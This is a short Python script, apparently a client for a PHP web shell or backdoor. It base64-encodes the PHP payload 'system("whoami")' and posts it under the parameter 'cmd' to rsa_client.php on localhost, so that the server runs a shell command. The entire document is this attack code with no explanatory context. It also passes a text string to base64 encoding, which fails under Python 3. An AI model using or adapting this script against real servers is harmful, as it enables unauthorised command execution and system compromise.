import requests
import base64
url = "http://127.0.0.1/rsa_client.php"
payload = base64.b64encode("system(\"whoami\")")
res = requests.post(url=url,data={"cmd":payload})
print(res.content)

